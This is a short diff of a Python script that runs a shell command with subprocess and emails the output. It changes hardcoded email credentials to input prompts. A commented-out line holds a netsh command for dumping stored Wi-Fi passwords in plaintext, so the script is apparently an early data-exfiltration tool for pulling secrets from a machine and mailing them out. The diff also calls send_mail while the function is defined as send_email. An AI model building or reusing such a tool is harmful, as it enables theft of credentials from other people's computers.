@@ -16,7 +16,9 @@ def send_email(email, password, message):
 
 #command = "msg * Test Message"
 #command = "netsh wlan show profile <ESSID> key=clear" #-show wlan profiles stored on computer, key in plaintext form
+email = input("Enter email address to send to: ")
+password = input("Enter email password: ")
 command = "hostname"
 result = subprocess.check_output(command, shell=True)
-send_mail("bubblebub@buble.com", "password", result)
+send_mail(email, password, result)
 #subprocess.Popen(command, shell=True)
